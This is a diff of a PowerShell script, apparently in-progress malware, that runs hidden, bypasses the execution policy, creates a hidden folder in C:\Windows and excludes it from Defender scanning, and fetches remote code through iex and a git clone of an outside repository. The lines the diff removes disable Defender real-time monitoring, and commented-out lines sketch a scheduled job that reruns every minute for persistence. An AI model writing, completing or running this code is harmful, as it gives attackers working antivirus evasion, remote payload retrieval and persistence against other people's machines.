@@ -20,33 +20,38 @@ function RunAdminAndBypass
 	Set-ExecutionPolicy -ExecutionPolicy Bypass -Force
 }
 
-function TurnOffFirewall
+function DownloadExeShellAndExcludeFromScan
 {
-	Set-MpPreference -DisableRealtimeMonitoring $true
+	New-Item -Path "C:\Windows\" -Name "Win" -ItemType "directory"
+	Add-MpPreference -ExclusionPath "C:\Windows\Win"
+	attrib +h C:\Windows\Win
+	cd C:\Windows\Win
+	Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
+	choco install -y git
+	& 'C:\Program Files\Git\cmd\git.exe' clone https://github.com/RuthIsRoot/script.git 
+	
 }
 
-function TurnOnFirewall
-{
-	Set-MpPreference -DisableRealtimeMonitoring $false
-}
-
-function DownloadExeShell
-{
-	New-Item -Path "C:\Users\$env:UserName\" -Name "winfiles" -ItemType "directory"
-	attrib +h C:\Users\$env:UserName\winfiles
-	(new-object System.Net.WebClient).DownloadFile('http://www.xyz.net/file.txt','C:\tmp\file.txt')
-}
-
-function ExcludeExeShell
+function ExecuteShell
 {
 	
 }
 
 function TriggerExecution
 {
+	# Take a look on this
 	
+	# $trigger = New-JobTrigger `
+	# -Once `
+	# -At (Get-Date) `
+	# -RepetitionInterval (New-TimeSpan -Minutes 1) `
+	# -RepetitionDuration ([System.TimeSpan]::MaxValue)
+	
+	# Register-ScheduledJob -Name Test -FilePath C:\Users\34601\Desktop\test.ps1 -Trigger $trigger
 }
 
 Hide-Console
 RunAdminAndBypass
-TurnOffFirewall
+DownloadExeShellAndExcludeFromScan
+ExecuteShell
+TriggerExecution
